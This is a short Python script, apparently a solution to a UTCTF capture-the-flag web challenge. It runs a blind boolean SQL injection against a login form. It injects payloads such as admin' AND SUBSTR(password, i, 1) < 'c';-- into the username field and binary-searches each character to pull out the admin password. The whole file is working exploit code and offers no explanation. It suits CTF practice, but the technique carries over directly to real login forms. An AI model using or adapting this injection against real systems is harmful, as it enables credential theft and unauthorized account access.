import requests
import string

def check(payload):
    url = 'http://web2.utctf.live:5006/'
    params = {'username': payload, 'pass': ''}
    r = requests.post(url, data=params)

    if 'elcome, admin!' in r.text:
        return True
    else:
        return False


length = 24

while 1:
    sql = f'admin\' AND LENGTH(password) = {length};-- '
    print(length)
    if check(sql):
        print(length)
        break
    length += 1

password = ''
for index in range(1, length + 1):
    low, high = 32, 126
    while(True):
        mid = (low + high) // 2
        char = chr(mid)
        sql = f'admin\' AND SUBSTR(password, {index}, 1) = \'{char}\';-- '

        if check(sql):
            print(index, char)
            password += char
            break

        sql = f'admin\' AND SUBSTR(password, {index}, 1) < \'{char}\';-- '

        if check(sql):
            high = mid - 1
        else:
            low = mid + 1

print(password)
